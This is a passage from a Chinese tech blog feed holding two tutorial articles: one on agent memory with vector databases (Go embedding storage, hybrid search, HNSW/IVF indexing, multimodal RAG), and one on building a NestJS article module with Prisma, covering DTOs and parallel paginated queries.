<p>本预处理，可能需要去除无意义的语气词、标准化格式，这步看似简单但影响后续检索质量。然后调用Embedding 模型转换成向量，这一步要注意选择合适的模型，电商客服场景可能需要对领域术语敏感的模型，通用对话可能直接用 OpenAI 的接口就够了。接下来是向量入库，这里不只是存向量本身，还要把元数据一起存储。</p>
<pre><code class="hljs language-go" lang="go">    <span class="hljs-comment">// MemoryPersistenceService 记忆持久化服务</span>
<span class="hljs-keyword">type</span> MemoryPersistenceService <span class="hljs-keyword">struct</span> {
	embeddingClient EmbeddingClient
	vectorStore     VectorStore
}
<span class="hljs-comment">//NweMemoryPersistenceService 创建服务实例</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewMemoryPersistenceService</span><span class="hljs-params">(embeddingClient EmbeddingClient, vectorStore VectorStore)</span></span> *MemoryPersistenceService {
	<span class="hljs-keyword">return</span> &amp;MemoryPersistenceService{
		embeddingClient: embeddingClient,
		vectorStore:     vectorStore,
	}
}
/ SaveMemory 保存记忆到向量数据库
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *MemoryPersistenceService)</span></span> SaveMemory(ctx context.Context, userId, conversation <span class="hljs-type">string</span>) <span class="hljs-type">error</span> {
	<span class="hljs-comment">// 生成向量表示</span>
	embedding, err := s.embeddingClient.Embed(ctx, conversation)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-comment">// 构造元数据</span>
	metadata := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{}{
		<span class="hljs-string">"user_id"</span>:    userId,
		<span class="hljs-string">"timestamp"</span>:  time.Now().UnixMilli(),
		<span class="hljs-string">"content"</span>:    conversation,
		<span class="hljs-string">"session_id"</span>: getCurrentSessionId(),
	}

	<span class="hljs-comment">// 存入向量数据库</span>
	<span class="hljs-keyword">return</span> s.vectorStore.Insert(ctx, embedding, metadata)
}

<span class="hljs-comment">// 依赖的接口定义</span>
<span class="hljs-keyword">type</span> EmbeddingClient <span class="hljs-keyword">interface</span> {
	Embed(ctx context.Context, text <span class="hljs-type">string</span>) ([]<span class="hljs-type">float32</span>, <span class="hljs-type">error</span>)
}

<span class="hljs-keyword">type</span> VectorStore <span class="hljs-keyword">interface</span> {
	Insert(ctx context.Context, embedding []<span class="hljs-type">float32</span>, metadata <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{}) <span class="hljs-type">error</span>
}

<span class="hljs-comment">// getCurrentSessionId 获取当前会话ID（示例实现，实际根据业务逻辑）</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getCurrentSessionId</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> {
	<span class="hljs-comment">// 这里替换为实际的会话ID获取逻辑</span>
	<span class="hljs-keyword">return</span> <span class="hljs-string">"session_123"</span>
}
</code></pre>
<p>这里的元数据界定了后续作甚么样的过滤和排序，检索是流程反过来，把查询到的文本想来概念化，然后再向量数据库做相似度检索。
生产环境还要考虑缓存热点记忆、异步写入、失败重试这些工程问题。理论和实践之间有很大的差距，比如异步写入虽然能提升吞吐量，但要处理好主库写入成功但向量库写入失败的一致性问题。
向量数据库和传统数据库的本质差异在于索引结构的设计目标完全不同。传统数据库的 B + 树索引是为范围查询优化的，比如查年龄在 20 到 30 之间的用户，时间复杂度是 O (log n)。但向量检索要的是 “找最相似的 K 个向量”，这是完全不同的计算模式。如果用 MySQL 暴力计算余弦相似度，百万级数据每次查询要做上百万次浮点运算，延迟会达到秒级甚至更高。
向量数据库专门为高维向量的相似度计算设计了索引结构。比如HNSW 算构建的图索引，把向量空间组织成多层图结构，检索时从顶层快速定位区域，再逐层下钻找到最近邻，时间复杂度是对数级别的。另一种常见的是IVF 索引，先用聚类算法把向量空间划分成若干个区域，检索时只在最相关的几个区域里搜索，大幅减少计算量。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6301c3ca9f6940b0ad4d3350196c1c6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ3lhbll1TXU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770705135&amp;x-signature=1ok2HUu6qheM3dSaMMK83xQXf4A%3D" alt="3036c919ad8f9416e22aaab067a3023.png" loading="lazy"/></p>
<h3 data-id="heading-4">混合检索</h3>
<pre><code class="hljs">刚刚也提到了元数据，那为什么要用到元数据和这里所提到的混合检索有关，很多业务股则要和向量检索结合。实现思路是先用向量粗排序召回更多候选，再通过元数据过滤重排序得到最终结果。
</code></pre>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> service

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"sort"</span>
	<span class="hljs-string">"time"</span>
)

<span class="hljs-comment">// HybridSearchService 混合检索服务</span>
<span class="hljs-keyword">type</span> HybridSearchService <span class="hljs-keyword">struct</span> {
	vectorDB VectorDatabase
}

<span class="hljs-comment">// NewHybridSearchService 创建服务实例</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewHybridSearchService</span><span class="hljs-params">(vectorDB VectorDatabase)</span></span> *HybridSearchService {
	<span class="hljs-keyword">return</span> &amp;HybridSearchService{vectorDB: vectorDB}
}

<span class="hljs-comment">// SearchMemories 执行混合检索</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *HybridSearchService)</span></span> SearchMemories(ctx context.Context, req *SearchRequest) ([]*Memory, <span class="hljs-type">error</span>) {
	<span class="hljs-comment">// 第一步：向量粗排，召回3倍候选</span>
	candidates, err := s.vectorDB.SimilaritySearch(ctx, req.QueryEmbedding, req.TopK*<span class="hljs-number">3</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
	}

	<span class="hljs-comment">// 第二步：元数据过滤</span>
	filtered := <span class="hljs-built_in">make</span>([]*VectorMatch, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(candidates))
	<span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> candidates {
		<span class="hljs-keyword">if</span> isWithinTimeRange(m, req.TimeRange) &amp;&amp; matchesUserSegment(m, req.UserID) {
			filtered = <span class="hljs-built_in">append</span>(filtered, m)
		}
	}

	<span class="hljs-comment">// 第三步：混合打分重排</span>
	scoredMemories := <span class="hljs-built_in">make</span>([]*ScoredMemory, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(filtered))
	<span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> filtered {
		score := s.calculateHybridScore(m, req)
		scoredMemories = <span class="hljs-built_in">append</span>(scoredMemories, &amp;ScoredMemory{
			Memory: m.Memory,
			Score:  score,
		})
	}

	<span class="hljs-comment">// 按分数降序排序</span>
	sort.Slice(scoredMemories, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> {
		<span class="hljs-keyword">return</span> scoredMemories[i].Score &gt; scoredMemories[j].Score
	})

	<span class="hljs-comment">// 取TopK结果</span>
	resultCount := req.TopK
	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(scoredMemories) &lt; resultCount {
		resultCount = <span class="hljs-built_in">len</span>(scoredMemories)
	}
	results := <span class="hljs-built_in">make</span>([]*Memory, <span class="hljs-number">0</span>, resultCount)
	<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; resultCount; i++ {
		results = <span class="hljs-built_in">append</span>(results, scoredMemories[i].Memory)
	}

	<span class="hljs-keyword">return</span> results, <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// calculateHybridScore 计算混合检索得分</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *HybridSearchService)</span></span> calculateHybridScore(match *VectorMatch, req *SearchRequest) <span class="hljs-type">float64</span> {
	vectorScore := match.Similarity
	recencyScore := s.calculateRecency(match.Timestamp)
	importanceScore, ok := match.Metadata[<span class="hljs-string">"importance"</span>].(<span class="hljs-type">float64</span>)
	<span class="hljs-keyword">if</span> !ok {
		importanceScore = <span class="hljs-number">0.5</span>
	}

	<span class="hljs-comment">// 权重可根据业务调整</span>
	<span class="hljs-keyword">return</span> <span class="hljs-number">0.6</span>*vectorScore + <span class="hljs-number">0.3</span>*recencyScore + <span class="hljs-number">0.1</span>*importanceScore
}

<span class="hljs-comment">// calculateRecency 计算时间衰减得分</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *HybridSearchService)</span></span> calculateRecency(timestamp <span class="hljs-type">int64</span>) <span class="hljs-type">float64</span> {
	ageInDays := (time.Now().UnixMilli() - timestamp) / (<span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span>)
	<span class="hljs-keyword">return</span> <span class="hljs-type">float64</span>(math.Exp(-<span class="hljs-type">float64</span>(ageInDays) / <span class="hljs-number">30.0</span>)) <span class="hljs-comment">// 30天衰减模型</span>
}

<span class="hljs-comment">// ---------------- 依赖的类型定义 ----------------</span>
<span class="hljs-keyword">type</span> SearchRequest <span class="hljs-keyword">struct</span> {
	QueryEmbedding []<span class="hljs-type">float32</span>
	TopK           <span class="hljs-type">int</span>
	TimeRange      [<span class="hljs-number">2</span>]<span class="hljs-type">int64</span> <span class="hljs-comment">// [start, end] 时间戳范围</span>
	UserID         <span class="hljs-type">string</span>
}

<span class="hljs-keyword">type</span> VectorMatch <span class="hljs-keyword">struct</span> {
	Memory     *Memory
	Similarity <span class="hljs-type">float64</span>
	Timestamp  <span class="hljs-type">int64</span>
	Metadata   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{}
}

<span class="hljs-keyword">type</span> ScoredMemory <span class="hljs-keyword">struct</span> {
	Memory *Memory
	Score  <span class="hljs-type">float64</span>
}

<span class="hljs-keyword">type</span> Memory <span class="hljs-keyword">struct</span> {
	<span class="hljs-comment">// 根据实际业务定义Memory的字段</span>
}

<span class="hljs-keyword">type</span> VectorDatabase <span class="hljs-keyword">interface</span> {
	SimilaritySearch(ctx context.Context, embedding []<span class="hljs-type">float32</span>, topK <span class="hljs-type">int</span>) ([]*VectorMatch, <span class="hljs-type">error</span>)
}

<span class="hljs-comment">// 辅助过滤函数（示例实现）</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isWithinTimeRange</span><span class="hljs-params">(m *VectorMatch, timeRange [2]<span class="hljs-type">int64</span>)</span></span> <span class="hljs-type">bool</span> {
	<span class="hljs-keyword">return</span> m.Timestamp &gt;= timeRange[<span class="hljs-number">0</span>] &amp;&amp; m.Timestamp &lt;= timeRange[<span class="hljs-number">1</span>]
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">matchesUserSegment</span><span class="hljs-params">(m *VectorMatch, userID <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> {
	<span class="hljs-comment">// 实际业务逻辑：匹配用户分群</span>
	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
}
</code></pre>
<h3 data-id="heading-5">缓存策略</h3>
<p>在某些业务场景中油热点查询，这个时候在应用层加一层LRU缓存，把最近检索过的query和对应记忆ID缓存下来。
和业务里的redis做缓存防止击穿是一个道理。</p>
<h6 data-id="heading-6">以上这些可以总结为怎么提高召回率。怎么根据具体的情况对数据库进行选型等。</h6>
<h3 data-id="heading-7">谈谈多模态</h3>
<p>多模态在Rag领域里也火了起来。问题在于怎么自己做跨模态对齐，是个值得关注的前沿方向。现在很多 Agent 不只处理文本，还要记忆图片、语音这些多模态信息，这时候需要把不同模态的数据映射到同一个向量空间，用 CLIP 这类跨模态模型做 embedding。实际落地时要考虑不同模态的权重，比如电商客服记住用户发的产品图片比记住语气词更重要，检索时可以给图片向量更高的权重。具体实现上可以分别存储文本向量和图像向量，检索时做两次查询再合并结果，也可以用跨模态模型直接生成统一的向量表示。
从 Agent 记忆往外延伸还能关联到 RAG 的架构设计。Agent 的记忆系统本质上是 RAG 的一个应用场景，都是通过检索来增强生成的准确性。但两者也有差异，RAG 通常是检索固定的知识库，而 Agent 记忆是检索不断增长的交互历史。如果要做更复杂的推理，可以把知识图谱和向量检索结合，先用向量找到相关实体，再通过图谱关系扩展出更多上下文。比如用户问 “那个推荐过红色款的客服是谁”，先通过向量找到 “红色款推荐” 相关的记忆，再通过图谱关系找到对应的客服人员节点。
未来向量数据库会朝着几个方向发展。原生多模态支持会成为标配，不需要自己做跨模态对齐。更智能的索引自动调优，系统能根据查询模式自动选择最优索引策略，而不是靠 DBA 手动配置参数。和大模型的深度整合也是趋势，比如直接在向量数据库里做 Embedding，减少网络传输开销，甚至可能出现向量数据库和推理引擎一体化的产品。这些演进方向都在解决同一个核心问题：让 AI 应用的记忆系统更高效、更智能、更易用。</p>
<p>这个之后也会整理出来一篇~。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别 N+1 与慢查询：NestJS 文章模块的高性能实现]]></title>    <link>https://juejin.cn/post/7602259669731196955</link>    <guid>https://juejin.cn/post/7602259669731196955</guid>    <pubDate>2026-02-03T06:48:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669731196955" data-draft-id="7602303923170213897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别 N+1 与慢查询：NestJS 文章模块的高性能实现"/> <meta itemprop="keywords" content="后端,TypeScript,React.js"/> <meta itemprop="datePublished" content="2026-02-03T06:48:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="秃头敲码小姐姐"/> <meta itemprop="url" content="https://juejin.cn/user/24668014656249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别 N+1 与慢查询：NestJS 文章模块的高性能实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/24668014656249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    秃头敲码小姐姐
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:48:44.000Z" title="Tue Feb 03 2026 06:48:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代后端开发中，选择合适的工具链对于提升开发效率和保证代码质量至关重要。NestJS 作为一款基于 Node.js 的渐进式框架，凭借其优雅的面向对象设计和对 TypeScript 的完美支持，成为了构建企业级应用的首选。而 Prisma 作为新一代的 Node.js 和 TypeScript ORM，以其类型安全、直观的 API 和强大的迁移功能，极大地简化了数据库操作。</p>
<p>本文将带你从零开始，通过一个博客系统的核心模块——文章管理，深入实战 NestJS 与 Prisma 的集成。我们将重点探讨如何利用 Prisma 实现高效的数据查询、关联数据处理以及数据传输对象（DTO）的规范化管理。</p>
<h4 data-id="heading-0">一、环境准备与 Prisma 集成</h4>
<p>在开始编码之前，确保你已经安装了 NestJS CLI 并创建了一个新的项目。随后，安装 Prisma 及其相关依赖：</p>
<pre><code class="hljs language-css" lang="css">npm install prisma <span class="hljs-attr">--save-dev</span>
npm install <span class="hljs-keyword">@prisma</span>/client
</code></pre>
<p>初始化 Prisma 并配置你的数据库连接（以 PostgreSQL 为例）：</p>
<pre><code class="hljs language-csharp" lang="csharp">npx prisma <span class="hljs-keyword">init</span>
</code></pre>
<p>这将在项目根目录下生成 <code>prisma</code> 文件夹及 <code>schema.prisma</code> 文件。配置数据源和模型是使用 Prisma 的第一步。例如，定义一个简单的 <code>Post</code> 模型：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">model Post {
  id        <span class="hljs-built_in">Int</span>      <span class="hljs-meta">@id</span> <span class="hljs-meta">@default(autoincrement())</span>
  title     String
  content   String?
  published <span class="hljs-built_in">Boolean</span>  <span class="hljs-meta">@default(false)</span>
  author    User     <span class="hljs-meta">@relation(fields: [authorId], references: [id])</span>
  authorId  <span class="hljs-built_in">Int</span>
  tags      Tag[]
  createdAt DateTime <span class="hljs-meta">@default(now())</span>
  updatedAt DateTime <span class="hljs-meta">@updatedAt</span>
}
</code></pre>
<p>接下来，我们需要在 NestJS 中集成 Prisma。创建一个 <code>PrismaService</code>，它将作为应用程序与数据库交互的单一入口点。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span>, <span class="hljs-title class_">OnModuleInit</span>, <span class="hljs-title class_">OnModuleDestroy</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaClient</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@prisma/client'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrismaService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">PrismaClient</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OnModuleInit</span>, <span class="hljs-title class_">OnModuleDestroy</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">onModuleInit</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.$connect();
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">onModuleDestroy</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.$disconnect();
  }
}
</code></pre>
<p>通过实现 <code>OnModuleInit</code> 和 <code>OnModuleDestroy</code> 接口，我们确保了在模块初始化时连接数据库，并在应用关闭时正确断开连接，防止资源泄漏。同时，使用 <code>@Global()</code> 装饰器将 <code>PrismaModule</code> 标记为全局模块，这样在其他任何模块中都不需要重复导入。</p>
<h4 data-id="heading-1">二、定义数据传输对象与参数校验</h4>
<p>在后端开发中，规范接口参数是保证应用健壮性的关键。NestJS 提供了 <code>class-validator</code> 和 <code>class-transformer</code> 库，让我们可以轻松地定义 DTO（Data Transfer Object）并进行参数校验。</p>
<p>例如，针对文章列表查询，我们创建一个 <code>PostQueryDto</code>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">import</span> { <span class="hljs-selector-tag">IsOptional</span>, <span class="hljs-selector-tag">IsInt</span> } <span class="hljs-selector-tag">from</span> '<span class="hljs-selector-tag">class-validator</span>';

<span class="hljs-selector-tag">export</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">PostQueryDto</span> {
  <span class="hljs-variable">@IsOptional</span>()
  <span class="hljs-variable">@IsInt</span>()
  <span class="hljs-attribute">page</span>: number = <span class="hljs-number">1</span>;

  <span class="hljs-variable">@IsOptional</span>()
  <span class="hljs-variable">@IsInt</span>()
  <span class="hljs-attribute">limit</span>: number = <span class="hljs-number">10</span>;

  <span class="hljs-variable">@IsOptional</span>()
  title?: string;
}
</code></pre>
<p>在控制器中，我们可以通过管道（Pipe）自动验证传入的请求数据，将参数校验逻辑从业务代码中剥离，实现高内聚、低耦合。</p>
<h4 data-id="heading-2">三、实战：构建高效的文章服务</h4>
<p>有了基础的配置和 DTO，现在可以专注于业务逻辑的实现。在 <code>PostsService</code> 中，我们将展示如何利用 Prisma 进行复杂的数据查询和处理。</p>
<p><strong>1. 高效的分页查询</strong></p>
<p>分页是列表接口的标配。为了提升性能，我们可以利用 <code>Promise.all</code> 并行执行总数查询和列表查询，减少数据库往返时间。</p>
<pre><code class="hljs language-php" lang="php">async <span class="hljs-title function_ invoke__">findAll</span>(<span class="hljs-attr">query</span>: PostQueryDto) {
  <span class="hljs-keyword">const</span> { page, limit, title } = query;
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">skip</span> = ((page || <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>) * (limit || <span class="hljs-number">10</span>);

  <span class="hljs-comment">// 性能优化：使用 Promise.all 并行查询总数和列表</span>
  <span class="hljs-keyword">const</span> [total, posts] = await Promise.<span class="hljs-title function_ invoke__">all</span>([
    this.prisma.post.<span class="hljs-title function_ invoke__">count</span>({ <span class="hljs-attr">where</span>: { <span class="hljs-attr">title</span>: { <span class="hljs-attr">contains</span>: title } } }),
    this.prisma.post.<span class="hljs-title function_ invoke__">findMany</span>({
      skip,
      <span class="hljs-attr">take</span>: limit,
      <span class="hljs-attr">orderBy</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'desc'</span> },
      <span class="hljs-attr">where</span>: { <span class="hljs-attr">title</span>: { <span class="hljs-attr">contains</span>: title } },
      // 关联查询
      <span class="hljs-attr">include</span>: {
        <span class="hljs-attr">user</span>: { <span class="hljs-attr">select</span>: { <span class="hljs-attr">id</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">name</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">avatars</span>: <span class="hljs-literal">true</span> } },
        <span class="hljs-attr">tags</span>: { <span class="hljs-attr">select</span>: { <span class="hljs-attr">tag</span>: { <span class="hljs-attr">select</span>: { <span class="hljs-attr">name</span>: <span class="hljs-literal">true</span> } } } },
        <span class="hljs-attr">_count</span>: { <span class="hljs-attr">select</span>: { <span class="hljs-attr">likes</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">comments</span>: <span class="hljs-literal">true</span> } },
        <span class="hljs-attr">files</span>: { <span class="hljs-attr">where</span>: { <span class="hljs-attr">mimetype</span>: { <span class="hljs-attr">startsWith</span>: <span class="hljs-string">"image/"</span> } }, <span class="hljs-attr">select</span>: { <span class="hljs-attr">filename</span>: <span class="hljs-literal">true</span> } }
      }
    })
  ]);

  <span class="hljs-comment">// 数据重塑：将原始数据转换为前端所需格式</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">data</span> = posts.<span class="hljs-title function_ invoke__">map</span>(post =&gt; ({
    <span class="hljs-attr">id</span>: post.id,
    <span class="hljs-attr">title</span>: post.title,
    <span class="hljs-attr">brief</span>: post.content?.<span class="hljs-title function_ invoke__">substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>) || <span class="hljs-string">''</span>,
    <span class="hljs-attr">user</span>: {
      <span class="hljs-attr">id</span>: post.user?.id,
      <span class="hljs-attr">name</span>: post.user?.name,
      <span class="hljs-attr">avatar</span>: `<span class="hljs-attr">http</span>://<span class="hljs-attr">localhost</span>:<span class="hljs-number">3000</span>/uploads/avatar/resized/${post.user?.avatars[<span class="hljs-number">0</span>]?.filename}-small.jpg`
    },
    <span class="hljs-attr">tags</span>: post.tags.<span class="hljs-title function_ invoke__">map</span>(t =&gt; t.tag.name),
    <span class="hljs-attr">totalLikes</span>: post._count.likes,
    <span class="hljs-attr">totalComments</span>: post._count.comments,
    <span class="hljs-attr">thumbnail</span>: post.files[<span class="hljs-number">0</span>]?.filename ? `<span class="hljs-attr">http</span>://<span class="hljs-attr">localhost</span>:<span class="hljs-number">3000</span>/uploads/resized/${post.files[<span class="hljs-number">0</span>]?.filename}-thumbnail.jpg` : <span class="hljs-string">""</span>
  }));

  <span class="hljs-keyword">return</span> { items: data, total };
}
</code></pre>
<p><strong>2. 数据重塑与关联处理</strong></p>
<p>在上述代码中，我们不仅查询了文章数据，还通过 <code>include</code> 关键字关联查询了作者、标签、点赞数和评论数等信息。随后，通过 <code>map</code> 方法对数据进行了重塑，截取了内容摘要、拼接了图片的完整 URL 并提取了标签名称。这种做法将数据库的原始数据转换成了前端可以直接使用的简洁格式，提升了接口的可用性。</p>
